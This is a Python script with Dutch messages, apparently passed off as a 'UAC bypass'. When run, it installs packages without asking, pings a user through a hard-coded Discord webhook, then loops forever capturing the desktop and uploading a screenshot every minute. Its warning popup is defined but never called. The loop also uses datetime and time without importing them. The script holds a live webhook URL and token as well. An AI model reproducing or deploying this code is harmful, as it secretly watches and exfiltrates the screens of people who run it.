import tkinter as tk
from tkinter import messagebox
import os
os.system("py -m pip install pyautogui requests pillow")
import pyautogui
import requests
import io
def show_message():
    messagebox.showinfo("Information", "Hallo! Je ziet deze melding omdat je waarschijnlijk recent mijn UAC bypass hebt gebruikt. Dit is een waarschuwing dat je niet zomaar alles wat ik stuur kan vertrouwen. Zie de discord server waar je gepinged bent voor meer informatie.")

def take_screenshot():
    screenshot = pyautogui.screenshot()
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    return byte_io

def send_to_discord(webhook_url, file):
    files = {
        'file': ('screenshot.png', file, 'image/png')
    }
    response = requests.post(webhook_url, files=files)
    if response.status_code == 200:
        print("Screenshot sent successfully.")
    else:
        print(f"Failed to send screenshot. Status code: {response.status_code}")

webhook_url = "https://discord.com/api/webhooks/1327001774636404828/un6Z5d8efzD28ygQuXAGoBfMKra68ofsjhqKVgHDOoyll0yE5SqeGsu64rS8OwOijpwE"
message = "<@569169878200877056> Hier is de screenshot van je bureaublad. Om dit te verwijderen, druk WIN + R, en verwijder het bestand genaamd fikoalert.exe"
payload = {
    'content': message
}
response = requests.post(webhook_url, json=payload)
if response.status_code == 204:
    print("Message sent successfully.")
else:
    print(f"Failed to send message. Status code: {response.status_code}")

while True:
    screenshot = take_screenshot()
    message = datetime.now()
    payload = {
        'content': message
    }
    response = requests.post(webhook_url, json=payload)
    send_to_discord(webhook_url, screenshot)
    time.sleep(60)

